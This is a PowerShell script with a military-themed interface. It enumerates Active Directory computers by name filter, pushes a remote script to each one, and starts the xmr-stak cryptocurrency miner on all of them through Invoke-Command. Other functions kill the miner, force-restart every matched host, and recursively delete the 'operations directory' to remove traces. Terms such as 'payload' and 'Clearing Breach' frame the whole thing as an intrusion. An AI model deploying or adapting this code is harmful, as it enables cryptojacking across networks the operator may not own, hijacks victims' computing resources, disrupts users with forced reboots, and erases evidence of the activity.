# Retreive JSON Config and set Global Variables

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)


# Main Functions

function fireBase($outputPane, $progressBar) {

$opsDir = $missionParameters.ops
$filterTarget = $missionParameters.Target
$advanceParty = $missionParameters.ap
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = "invoke-command -computername $client -FilePath $advanceParty"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command $Scriptblock"

}
}

function fireMission($outputPane, $progressBar) {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64\config.txt' -C '$opsDir\xmr-stak-win64\pools.txt'}"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command  $Scriptblock"

}
}

function clearBreach($outputPane, $progressBar) {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
Invoke-Command -ComputerName $client -ScriptBlock { Stop-Process -Name xmr-stak }
$outputPane.text = "$client - Clearing Breach..."

}

Get-Process -Name powershell | Where-Object -FilterScript { $_.Id -ne $PID } | Stop-Process -Passthru
$outputPane.text = "Breaches CLEAR!"

}

function reinitGunline($outputPane, $progressBar) {

$filterTarget = $missionParameters.Target
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.Text = "Sending command to $client..."
Restart-Computer -ComputerName $client -Force

}

Get-Process -Name powershell | Where-Object -FilterScript { $_.Id -ne $PID } | Stop-Process -Passthru

}

function gridCheck($outputPane) {

$searchbase = $missionParameters.search.DistinguishedName
$searchOU = $missionParameters.search.Name
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$advanceParty = $missionParameters.ap
$payload = $missionParameters.payload
$outputPane.text = "Mission Parameters:`n`nSearch Base: $searchBase`n`nSelected OU(s): $searchOU`n`nFilter Target: $filterTarget`n`nOperations Directory: $opsDir`n`nPayload Path: $payload`n`nAdvance Party: $advanceParty"

}

function moveOut($outputPane, $progressBar) {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { write-host $client ‘Operations Directory = REMOVED’ ; Remove-Item -path $opsDir -Recurse -Force } Else { write-host 'Operations Directory = NON-EXISTANT' }}”
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command $Scriptblock"

}
}


# Sick ASCII art functions

function showFireBase($outputPane) { 

$logoASCIIfireBase = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .      
▐▄▄·██ ▀▄ █·▀▄.▀·      
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄      
██▌.▐█▌▐█•█▌▐█▄▄▌      
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀       
▄▄▄▄·  ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▀▄.▀·
▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
██▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
"
$outputPane.text = $logoASCIIfireBase 

}

function showFireMission($outputPane) { 

$logoASCIIfireMission = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .                     
▐▄▄·██ ▀▄ █·▀▄.▀·                     
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄                     
██▌.▐█▌▐█•█▌▐█▄▄▌                     
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀                      
• ▌ ▄ ·. ▪  .▄▄ · .▄▄ · ▪         ▐ ▄ 
·██ ▐███▪██ ▐█ ▀. ▐█ ▀. ██ ▪     •█▌▐█
▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄▄▀▀▀█▄▐█· ▄█▀▄ ▐█▐▐▌
██ ██▌▐█▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█▌.▐▌██▐█▌
▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪
"
$outputPane.text = $logoASCIIfireMission 

}

function showClearBreach($outputPane) { 

$logoASCIIclearBreach = "
 ▄▄· ▄▄▌  ▄▄▄ . ▄▄▄· ▄▄▄        
▐█ ▌▪██•  ▀▄.▀·▐█ ▀█ ▀▄ █·      
██ ▄▄██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄       
▐███▌▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█•█▌      
·▀▀▀ .▀▀▀  ▀▀▀  ▀  ▀ .▀  ▀      
▄▄▄▄· ▄▄▄  ▄▄▄ . ▄▄▄·  ▄▄·  ▄ .▄
▐█ ▀█▪▀▄ █·▀▄.▀·▐█ ▀█ ▐█ ▌▪██▪▐█
▐█▀▀█▄▐▀▀▄ ▐▀▀▪▄▄█▀▀█ ██ ▄▄██▀▐█
██▄▪▐█▐█•█▌▐█▄▄▌▐█ ▪▐▌▐███▌██▌▐▀
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀  ▀ ·▀▀▀ ▀▀▀ ·
"
$outputPane.text = $logoASCIIclearBreach 

}

function showReinitGunline($outputPane) { 

$logoASCIIreinitGunline = "
▄▄▄  ▄▄▄ .▪   ▐ ▄ ▪  ▄▄▄▄▄        
▀▄ █·▀▄.▀·██ •█▌▐███ •██          
▐▀▀▄ ▐▀▀▪▄▐█·▐█▐▐▌▐█· ▐█.▪        
▐█•█▌▐█▄▄▌▐█▌██▐█▌▐█▌ ▐█▌·        
.▀  ▀ ▀▀▀ ▀▀▀▀▀ █▪▀▀▀ ▀▀▀         
 ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▌  ▪   ▐ ▄ ▄▄▄ .
▐█ ▀ ▪█▪██▌•█▌▐███•  ██ •█▌▐█▀▄.▀·
▄█ ▀█▄█▌▐█▌▐█▐▐▌██▪  ▐█·▐█▐▐▌▐▀▀▪▄
▐█▄▪▐█▐█▄█▌██▐█▌▐█▌▐▌▐█▌██▐█▌▐█▄▄▌
·▀▀▀▀  ▀▀▀ ▀▀ █▪.▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ 
"
$outputPane.text = $logoASCIIreinitGunline 

}

function showGridCheck($outputPane){ 

$logoASCIIgridCheck = "
 ▄▄ • ▄▄▄  ▪  ·▄▄▄▄      
▐█ ▀ ▪▀▄ █·██ ██▪ ██     
▄█ ▀█▄▐▀▀▄ ▐█·▐█· ▐█▌    
▐█▄▪▐█▐█•█▌▐█▌██. ██     
·▀▀▀▀ .▀  ▀▀▀▀▀▀▀▀▀•     
 ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ 
▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪
██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·
▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌
·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀
"
$outputPane.text = $logoASCIIgridCheck 

}

function showMoveOut($outputPane) { 

$logoASCIImoveOut = "
• ▌ ▄ ·.        ▌ ▐·▄▄▄ .      ▄• ▄▌▄▄▄▄▄
·██ ▐███▪▪     ▪█·█▌▀▄.▀·▪     █▪██▌•██  
▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐█•▐▀▀▪▄ ▄█▀▄ █▌▐█▌ ▐█.▪
██ ██▌▐█▌▐█▌.▐▌ ███ ▐█▄▄▌▐█▌.▐▌▐█▄█▌ ▐█▌·
▀▀  █▪▀▀▀ ▀█▄▀▪. ▀   ▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀ 
"
$outputPane.text = $logoASCIImoveOut 

}

function showRedLeg($outputPane) { 

$logoASCIIredLeg = "
▄▄▄  ▄▄▄ .·▄▄▄▄  ▄▄▌  ▄▄▄ . ▄▄ • 
▀▄ █·▀▄.▀·██▪ ██ ██•  ▀▄.▀·▐█ ▀ ▪
▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌██▪  ▐▀▀▪▄▄█ ▀█▄
▐█•█▌▐█▄▄▌██. ██ ▐█▌▐▌▐█▄▄▌▐█▄▪▐█
.▀  ▀ ▀▀▀ ▀▀▀▀▀• .▀▀▀  ▀▀▀ ·▀▀▀▀ 
"
$outputPane.text = $logoASCIIredLeg

}